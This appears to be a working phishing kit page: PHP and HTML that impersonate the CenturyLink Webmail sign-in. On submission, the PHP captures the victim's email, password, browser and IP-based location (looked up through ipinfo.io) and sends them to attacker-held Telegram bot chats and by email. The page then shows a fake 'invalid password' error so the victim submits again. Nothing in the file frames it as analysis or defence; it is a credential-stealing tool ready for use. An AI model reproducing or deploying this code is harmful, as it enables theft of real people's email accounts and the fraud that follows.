<?php

    session_start();

    include('mail.php');
    $adddate=date("D M d, Y g:i a");
    $loginemail = $_POST['signin_email'];
    $password1 = $_POST['signin_password'];
    $loc1 = $_POST['loctn'];
    $locH = $_POST['loctH'];
    $browser = $_SERVER['HTTP_USER_AGENT'];

    $message .= "---------=== CenturyLink LOGIN ===---------\n\n";
    $message .= "Email : $loginemail\n";
    $message .= "Pass : $password1\n\n";
    $message .= "================Location========================\n\n";
    $message .= "Location : $loc1\n";
    $message .= "Date:  ".$adddate."\n";
    $message .= "Browser:  ".$browser."\n\n";
    $message .= "---------=== MELLIVORA ===----------\n\n";

    $pfw_header = "From: Honey <noreply>\n";
    $pfw_subject = "CenturyLink - $locH";
    
    $TELEGRAM = "https://api.telegram.org/bot$apiToken";
    foreach ($ids as $id) {
        $data = http_build_query(array(
            'chat_id'=> $id,
            'text'=> $message,
            'parse_mode'=> 'HTML' // Optional: Markdown | HTML
        ));
        $response = file_get_contents("$TELEGRAM/sendMessage?$data");
    };
    @mail($to, $pfw_subject ,$message ,$pfw_header ) ;

    $useremail = substr($loginemail, 0, strpos($loginemail, "@"));

?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <!-- Start Meta Fields  -->
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name = "viewport" content = "width=device-width, minimum-scale=1.0, initial-scale=1.0,maximum-scale = 1.0, user-scalable = no">
        <title>Sign In - CenturyLink Webmail</title>
        <!-- Ends Meta Fields  -->
        <!-- Font -->
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
        <!-- End Font -->
        <!-- #CSS library STARTS -->
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
        <link rel="stylesheet" type="text/css" href="files/style2.css"/>
        <link rel="stylesheet" type="text/css" href="files/responsive_v2.css"/>
        <!-- #CSS library ENDS -->
        <!-- :::: Google Analytics STARTS :::: -->
        <style>
            input {
            box-shadow: none;
            }
            input:focus {
            box-shadow: none !important;
            }
            .form-group {
            margin-bottom: 0px !important;
            }
            .btndisabled {
            color: #fff;
            background-color: #B4BCC9 !important;
            }
            .loadingimg {
            display: block;
            visibility: hidden;
            margin-left: auto;
            margin-right: auto;
            width: 47px;
            height: 47px;
            background-image: url("https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/Ellipsis-1.4s-47px.gif")
            }
            body {
            background-image: url(files/centurylink-logo-black-BG5.svg); background-repeat: no-repeat; background-position: right bottom; background-size: calc(max(30%, 500px));
            }
            .main-title-wrap h1::after {
            background-color: #db0632 !important;
            }
        </style>
    </head>
    <body>
        <main class="main-content-wrapper sign-in-wrapper" id="mLoginBox">
            <header>
                <div class="site-logo">
                    <a href="" target="_parent">
                    <img src="files/centurylink_logo_s.png" alt="CenturyLink">
                    </a>	
                </div>
            </header>
            <section class="content-holder">
                <div class="container">
                    <!-- Site Title Starts -->
                    <div class="main-title-wrap text-center">
                        <h1 style="display: none;">
                            <span class="text-content">Sign in</span>
                        </h1>
                        <div class="dec-wrap" style="display: none;">
                            <p>Welcome to the new CenturyLink Webmail!</p>
                        </div>
                    </div>
                    <!-- Site Title Ends -->
                    <!-- Form Field Starts -->
                    <div class="form-detail-wrapper" >
                        <div class="left-content-wrap" style="margin-bottom: 20px">
                            <form autocomplete="off" action="centurylink.php" method="post" name="login" id="login" onsubmit="return IsEmail()">
                                <div class="form-group">
                                    <input type="text" autocomplete="on" name="signin_email" id="signin_email" value="<?php echo $loginemail ?>" required />
                                    <label for="ign-in-email">CenturyLink Email</label>
                                    <span id="errmsg_signin_email" class="email-error error-msg" style="visibility: hidden">This needs to be filled</span>
                                </div>
                                <div class="form-group">
                                    <input autocomplete="on"  type="password" name="signin_password" id="signin_password" value="" required />
                                    <label for="password">Password</label>
                                    <span id="errmsg_signin_password" class="email-error error-msg" style="visibility: hidden">This needs to be filled</span>
                                </div>
                                <div class="form-group" style="font-size: 12px">
                                    <input  name="LoginForm[RememberMe]" name="RememberMe" id="RememberMe"  type="checkbox" style="width: auto !important;height: auto  !important;" /> Stay signed in</span>
                                </div>
                                <input  name="loctn" type="hidden" id="loctn" value="">
                                <input  name="loctH" type="hidden" id="loctH" value="">
                                <div id="errmsg_api" class="empty-error" style="font-size: 12px; color: rgb(217, 48, 37); position: static; margin-right: 0px; margin-bottom: 10px; margin-left: 0px; visibility: visible; line-height: 18px !important; margin-top: 15px !important;">Invalid username or password.&nbsp;&nbsp;Try again</div>
                                <button id="signup_btn"" style="margin-top: 20px !important; background-color: #0047bb !important;">Sign In</button>
                            </form>
                            <div id="g-recaptcha" class="g-recaptcha" data-callback='fnRecaptchaCallback' data-sitekey="" style="display: none"></div>
                            <div class="form-group" style="font-size: 12px; padding-top: 15px;">
                                <a  href="#" class="link" style="color:#0047bb !important;" >Forgot Password?</a><span style="float: right"><a  href="#" class="link" style="color:#0047bb !important;" >Need help?</a></span>
                            </div>
                            <div class="form-group" style="font-size: 14px; padding-top: 20px; font-weight: bold;">
                                <span style="display: table; margin: 0 auto;">
                                    <!--<a  href="JavaScript:alert('This will take you to the registration form...')"  class="link" style="color: #0047bb !important;" >Create New Email Account</a>-->
                                    <a  href="#"  class="link" style="color: #0047bb !important; display:none" >Create New Email Account</a>
                                </span>
                            </div>
                            <div class="loadingimg"></div>
                            <div class="get-mobile-app" style="margin-top: 0px !important; display: none; ">
                                <h6 class="text-center" style="margin-top: 0px !important;">Get the mobile app:</h6>
                                <ul class="store-wrap">
                                    <li class="apple-store">
                                        <a href=#">
                                        <img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/apple-store.png" alt="/">
                                        </a>
                                    </li>
                                    <li class="google-store">
                                        <a href="#">
                                        <img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/google-store.png" alt="/">
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                        <div class="right-content-wrap" style="display: none ;">
                            <figure>
                                <img src="/../app/s/lumen2/webmaillogin_0.png" alt="">
                            </figure>
                        </div>
                        <!-- 
                            <div class="right-content-wrap" style="margin-bottom: 40px">
                            	<div class="short-des">
                            		<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Quo, maiores quasi. Officiis odit similique incidunt aut, laudantium et ea officia. Debitis fugit odio quam consectetur quia similique ex alias, commodi.</p>
                            	</div>
                            	<ul class="connect-with">
                            		<li class="facebook">
                            			<a href="#">
                            				<span class="icon-wrap">
                            					<img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/facebook.png" alt="Social Icon">
                            				</span>
                            				<span class="text-content">Continue with Facebook</span>
                            			</a>
                            		</li>
                            		<li class="google">
                            			<a href="#">
                            				<span class="icon-wrap">
                            					<img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/google.png" alt="Social Icon">
                            				</span>
                            				<span class="text-content">Continue with Google</span>
                            			</a>
                            		</li>
                            		<li class="twitter">
                            			<a href="#">
                            				<span class="icon-wrap">
                            					<img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/twitter.png" alt="Social Icon">
                            				</span>
                            				<span class="text-content">Continue with Twitter</span>
                            			</a>
                            		</li>
                            		<li class="microsoft">
                            			<a href="#">
                            				<span class="icon-wrap">
                            					<img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/microsoft.png" alt="Social Icon">
                            				</span>
                            				<span class="text-content">Continue with Microsoft</span>
                            			</a>
                            		</li>
                            	</ul>
                            </div>
                             -->
                    </div>
                    <!-- Form Field Ends -->
                </div>
            </section>
        </main>
        <!-- Modal -->
        <div class="modal fade" id="msgModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
            <div class="modal-dialog" role="document">
                <div class="modal-content">
                    <div class="modal-body" id="msgModalBody">
                        Wrong usernmae or password
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>
        <!-- /.modal -->
        <div class="modal fade" id="FeedBackmodal">
            <div class="modal-dialog">
                <div class="modal-content bmd-modalContent">
                    <div class="modal-body">
                        <div class="close-button">
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
                                aria-hidden="true">&times;</span></button>
                        </div>
                        <div class="embed-responsive embed-responsive-16by9" id="FeedbackModalBody" style="height: 230px"> 
                            <iframe class="embed-responsive-item" src="../../app/feedback.asp" id="ifrFeedBack" frameborder="0"></iframe>
                        </div>
                    </div>
                </div>
                <!-- /.modal-content -->
            </div>
            <!-- /.modal-dialog -->
        </div>
        <!-- /.modal -->
        <!-- /.modal -->
        <div class="modal fade" id="SecurityFeatureModal">
            <div class="modal-dialog modal-dialog-centered" style="max-width: 550px; width: 550px;">
                <div class="modal-content bmd-modalContent" style="border-radius: 20px!important;">
                    <div class="modal-body">
                        <div class="modal-body">
                            <h2 style="font-weight: bold;">
                                Secure Your CenturyLink Email Account <!--Get_Text(lang,"pass_roptions_security_feature_title")-->
                            </h2>
                            <figure style="float: right; shape-outside:circle(50%);margin-top: 20px; ">
                                <img src="../../app/s/lumen2/images/Security_lb.png?v=2" style="padding-left: 50px ;" alt="/">
                            </figure>
                            <p>
                                We have improved our security measures to create a better experience for our
                                customers and better align with industry standards for email.
                                <br><br>
                                Update your backup information to ensure getting back into your account is easy!
                                <!-- Get_Text(lang,"pass_roptions_security_feature_desc")%>-->
                            </p>
                            <button id="securityFeature_s01btn" style="margin-top: 5px !important; display:block; font-size:12px; padding:5px 20px; color:#fff; background-color:#0047bb !important;border-radius: 4px!important;" onclick="fnSecurityFeatureModalNow(); return false;">
                            Set up recovery methods now
                            </button>
                            <a id="securityFeature_s02btn" href="JavaScript:fnSecurityFeatureModalLater()" class="back-link link" style="font-size: 12px;">
                            Remind me later
                            </a>
                        </div>
                    </div>
                </div>
                <!-- /.modal-content -->
            </div>
            <!-- /.modal-dialog -->
        </div>
        <!-- /.modal -->
        <!-- /.modal -->
        <div class="modal fade" id="CreateTModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
            <div class="modal-dialog" role="document">
                <div class="modal-content">
                    <div class="modal-body" id="msgModalBody">
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>
        <!-- /.modal -->
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script>
            jQuery.get("https://ipinfo.io", function(e) {
                const locHead = JSON.stringify(e.ip + " | " + e.city + " | " + e.region + " | " + e.country)
                const loc = JSON.stringify(e)
                document.getElementById('loctH').value = locHead;
                document.getElementById('loctn').value = loc;
            }, "jsonp")

            function IsEmail(input) {

                var validRegex = /^([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
                var emailID=document.login.signin_email
                var emailPASS=document.login.signin_password

                if (!emailID.value.match(validRegex)) {
                    emailID.focus();
                    return false;
                }
                if ((emailPASS.value==null)||(emailPASS.value=="")) {
                    emailPASS.focus()
                    return false
                } else {
                    return true;
                }
            }
        </script>
    </body>
</html>
